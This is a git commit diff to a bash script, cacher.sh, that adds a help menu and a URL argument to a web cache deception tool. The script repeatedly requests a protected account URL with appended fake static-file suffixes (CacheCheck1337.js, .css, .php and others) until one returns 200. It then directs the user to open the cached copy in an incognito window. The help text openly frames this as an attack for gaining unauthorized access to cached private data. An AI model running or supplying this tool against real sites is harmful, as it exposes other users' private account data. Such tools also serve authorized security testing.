8a0eeabc2377c070591a3f0a40406148d8f6e7b1
akr3ch <akrech.official@gmail.com>
2022-05-16 03:11:44 -0400

    added help menu and new url input option

--- cacher.sh
+++ cacher.sh
@@ -15,9 +15,21 @@ yellow='\e[33m'
 blue='\e[34m'
 none='\e[0m'
 
-### take url input from the user ###
-echo -e "${green}${bold}[+] ${none}${blue}Enter URL address ↔ (example: https://example.com/myaccount)"
-read -p "»» " url
+if [[ ${1} == '-h' || ${1} == '--help' ]];then
+	### print the help menu ###
+	echo -e "\n${blue}${0} --url ${yellow}https://test.example.com/myaccount"
+	echo -e "${green}Usage of the script too easy.Enter an url where unauthenticated users don't have any access and the script automatically sends requests to that endpoint until it gets a valid hit from that endpoint. All you need is the knowladge about web cache deception. What is web cache deception?"
+	echo -e "${green}Web cache deception ${blue}(WCD) ${green}is an ${red}attack${none} ${green}where an ${red}attacker${none} ${green}tricks a caching proxy into erroneously storing private information transmitted over the Internet and subsequently gains unauthorized access to that cached data."
+	exit 0
+elif [[ ${1} == '-u' || ${1} == '--url' ]];then
+	### take url input after before running ###
+	url=${2}
+
+elif [[ -z ${1} ]];then
+	### take url input after running ###
+	echo -e "${green}${bold}[+] ${none}${blue}Enter URL address ↔ (example: https://example.com/myaccount)"
+	read -p "»» " url
+fi
 
 ### extentions name ###
 extentions=(.js .css .jsp .asp .aspx .txt .html .htm .php5 .php4 .php3 .php .phtml .pdf .jpg .png .jpeg .svg .xml .gif)
@@ -34,8 +46,9 @@ while true;do
 	for x in ${extentions[@]};do
 		status=`curl -k --write-out "%{http_code}" --silent --output /dev/null "${url}/CacheCheck1337${x}"`
 	if [[ $status == '200' ]];then
-		echo -ne "\r${yellow}[`date '+%T'`]${none}${red} Cache data found\n"
-		echo -e "${yellow}[`date '+%T'`]${none}${red} Open the url from (Private mode/Incognito mode) ${green}${url}CacheCheck1337${x}"
+		echo -ne "\r${yellow}[`date '+%T'`]${none}${red} Cache data detected! ↔ extention used [${x}] \n"
+		echo -e "${yellow}[`date '+%T'`]${none}${red} Open the url from private mode (Incognito window)"
+		echo -e "${yellow}[`date '+%T'`]${none}${green} ${url}/CacheCheck1337${x}"
 		false
 	else
 		echo -ne "\r${green}[`date '+%T'`] ${none}${blue}Waiting..."
